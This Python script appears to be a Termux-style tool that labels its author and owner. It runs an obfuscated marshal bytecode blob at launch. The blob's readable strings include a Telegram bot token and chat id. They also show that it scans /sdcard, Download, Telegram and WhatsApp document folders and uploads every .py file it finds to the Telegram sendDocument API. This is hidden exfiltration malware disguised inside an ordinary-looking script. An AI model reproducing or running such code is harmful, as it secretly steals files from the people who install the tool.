"""OPEN BY ALTALIMUL ISLAM """
#_____________________[ADMIN BOX]____________________________#
""" AUTHOR : MD SHIMUL"""
""" OWNER : MRSH4MUL"""
#_____________________[IMPORT BOX]____________________________#
import os,sys,random,string,json,uuid,base64,requests,httpx,time,datetime,platform, subprocess, re, shutil
from time import localtime as lt
from time import sleep
from string import *
from rich.panel import Panel
from rich.console import Console
console = Console()
try:import git 
except ModuleNotFoundError:os.system('pip install -q gitpython');import git
from concurrent.futures import ThreadPoolExecutor as Tred
import hashlib,subprocess
#▬▭▬▭▬▭▬▭[ INSTALL ]▬▭▬▭▬▭▬▭#
try:import requests
except ModuleNotFoundError:
    os.system("clear");os.system("pip install requests")
    try:import requests
    except Exception as e:print(e);exit()
#_____________________[ETC]____________________________#
cpx,cokix,twx=[],[],[]
ok,cp,twf,okx=[],[],[],0
loop = 0
#_____________________[COLOUR BOX]____________________________#
W = "\033[1;37m";G = "\033[38;5;46m";G1 = "\033[38;5;47m";G2 = "\033[38;5;48m";G3 = "\033[38;5;49m";G4 = "\033[38;5;50m";R = "\033[38;5;196m";R3 = "\033[38;5;1m";R1 = "\033[38;5;202m";R2 = "\033[38;5;203m";C = "\033[38;5;4m";K="\033[38;5;15m";A="\033[38;5;248m";LG="\033[38;5;195m";A1="\033[38;5;250m";A2="\033[38;5;251m";A3="\033[38;5;252m";A4="\033[38;5;253m";A5="\033[38;5;254m";B="\033[38;5;153m";rad="\033[1;31m"
logo = '\x1b[38;5;154m';logo1 = '\x1b[38;5;155m';logo2 = '\x1b[38;5;156m';logo3 = '\x1b[38;5;157m';logo4 = '\x1b[38;5;158m'
#_____________________[SIM NAME CODE]____________________________#
try:
    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
    ahydra = output.replace(',', '|').replace('\n', '')
except Exception as e:
    pass
    ahydra = None
    

import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\xf3P\x01\x00\x00\x97\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x02l\x03m\x04Z\x05\x01\x00\t\x00d\x00d\x01l\x00Z\x00n\x1b#\x00\x01\x00\x02\x00e\x01j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00d\x01l\x00Z\x00Y\x00n\x03x\x03Y\x00w\x01d\x04\x84\x00Z\x07d\x05\x84\x00Z\x08d\x06\x84\x00Z\td\x07Z\nd\x08\x84\x00Z\x0b\x02\x00e\x05d\t\xac\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x005\x00Z\x0ce\x0c\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x0c\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x0c\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x0e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01d\x01d\x01\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00d\x01S\x00)\x0b\xe9\x00\x00\x00\x00N)\x01\xda\x12ThreadPoolExecutorz\x14pip install requestsc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\xf3,\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00d\x00S\x00)\x01N)\x02\xda\x08requests\xda\x07session)\x01r\x06\x00\x00\x00s\x01\x00\x00\x00 \xfa\x01 \xda\x06suyaibr\x08\x00\x00\x00\r\x00\x00\x00s\x14\x00\x00\x00\x80\x00\xdd\x0c\x14\xd4\x0c\x1c\xd1\x0c\x1e\xd4\x0c\x1e\x80G\x80G\x80G\xf3\x00\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3P\x07\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00d\x01}\x01d\x02}\x02\t\x00d\x03}\x03d\x04\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x0b}\x03d\x0c\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\r}\x03d\x0e\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x0f}\x03d\x10\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x11}\x03d\x12\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bd\x00S\x00#\x00\x01\x00Y\x00d\x00S\x00x\x03Y\x00w\x01)\x13N\xfa.6602564808:AAEkhZwDSKdFMQ8W9TjpgM_VxFzqzYN9jHk\xda\n6957719257z\x07/sdcardc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00\xa9\x01z\x03.py\xa9\x01\xda\x08endswith\xa9\x02\xda\x02.0\xda\x01fs\x02\x00\x00\x00  r\x07\x00\x00\x00\xfa\n<listcomp>z\x18sexy.<locals>.<listcomp>\x17\x00\x00\x00\xf3)\x00\x00\x00\x80\x00\xd0\x14M\xd0\x14M\xd0\x14M\x981\xb81\xbf:\xba:\xc0e\xd1;L\xd4;L\xd0\x14M\x90Q\xd0\x14M\xd0\x14M\xd0\x14Mr\t\x00\x00\x00\xda\x02rb\xfa\x1chttps://api.telegram.org/bot\xfa\r/sendDocument\xda\x07chat_id\xda\x08document\xa9\x02\xda\x04data\xda\x05filesz\x10/sdcard/Downloadc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>$\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00z\x19/sdcard/Download/Telegramc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>1\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00z\x1f/sdcard/Telegram/Telegram Filesc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>>\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00z)/sdcard/WhatsApp/Media/WhatsApp Documentsc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>K\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00)\x08r\x05\x00\x00\x00r\x06\x00\x00\x00\xda\x02os\xda\x07listdir\xda\x04open\xda\x04path\xda\x04join\xda\x04post\xa9\rr\x06\x00\x00\x00\xda\tbot_tokenr\x19\x00\x00\x00\xda\x0bsdcard_path\xda\tfile_list\xda\x04filer\x13\x00\x00\x00\xda\x03url\xda\x05data2r\x1c\x00\x00\x00r\x1d\x00\x00\x00\xda\x03get\xda\x04sents\r\x00\x00\x00             r\x07\x00\x00\x00\xda\x04sexyr1\x00\x00\x00\x0f\x00\x00\x00s\xef\x05\x00\x00\x80\x00\xdd\x0c\x14\xd4\x0c\x1c\xd1\x0c\x1e\xd4\x0c\x1e\x80G\xd8\x0f?\x80I\xd8\r\x19\x80G\xf0\x04\x0c\x05\x10\xe0\x16\x1f\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x16(\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x161\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x167\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x16A\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf0\x00\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\x884\xf8\xf8\xf8s\xf9\x00\x00\x00\x99A\x12C\x07\x00\xc1+A\x03B:\x05\xc2.\x0cC\x07\x00\xc2:\x04B>\t\xc2>\x03C\x07\x00\xc3\x01\x01B>\t\xc3\x02\x04C\x07\x00\xc3\x07\x02C\x0b\x03\xc3\x0fA\x12E=\x00\xc4!A\x03E0\x05\xc5$\x0cE=\x00\xc50\x04E4\t\xc54\x03E=\x00\xc57\x01E4\t\xc58\x04E=\x00\xc5=\x02F\x01\x03\xc6\x05A\x12H3\x00\xc7\x17A\x03H&\x05\xc8\x1a\x0cH3\x00\xc8&\x04H*\t\xc8*\x03H3\x00\xc8-\x01H*\t\xc8.\x04H3\x00\xc83\x02H7\x03\xc8;A\x12K)\x00\xca\rA\x03K\x1c\x05\xcb\x10\x0cK)\x00\xcb\x1c\x04K \t\xcb \x03K)\x00\xcb#\x01K \t\xcb$\x04K)\x00\xcb)\x02K-\x03\xcb1A\x12N \x00\xcd\x03A\x03N\x12\x05\xce\x06\x0cN \x00\xce\x12\x04N\x16\t\xce\x16\x03N \x00\xce\x19\x01N\x16\t\xce\x1a\x04N \x00\xce 